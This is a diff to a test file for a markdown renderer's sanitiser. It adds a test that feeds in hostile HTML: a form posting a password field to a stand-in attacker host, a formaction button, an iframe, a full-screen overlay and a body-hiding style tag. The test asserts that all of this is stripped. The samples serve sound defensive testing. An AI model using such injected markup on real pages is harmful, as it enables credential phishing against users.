@@ -23,7 +23,19 @@ describe('markdown sanitising', () => {
 		expect(t).toContain('<div class="tw"><table');
 		const c = renderMarkdown('```ts\nconst x = 1;\n```');
 		expect(c).toContain('class="code"');
-		expect(c).toContain('data-copy');
+		expect(c).not.toContain('<button');
 		expect(c).toContain('<pre>');
+	});
+	it('forbids forms, controls, styles, frames and style attributes', () => {
+		const html = renderMarkdown([
+			'<form action="https://evil.example" method="post"><input name="p" type="password"><textarea></textarea><select></select><button formaction="https://evil.example">Approve</button></form>',
+			'<div style="position:fixed;inset:0">overlay</div>',
+			'<style>body{display:none}</style>',
+			'<iframe src="https://evil.example"></iframe>',
+		].join('\n\n'));
+		for (const bad of ['<form', '<input', '<textarea', '<select', '<button', 'formaction', 'style', '<iframe', 'evil.example']) {
+			expect(html).not.toContain(bad);
+		}
+		expect(html).toContain('overlay');
 	});
 });
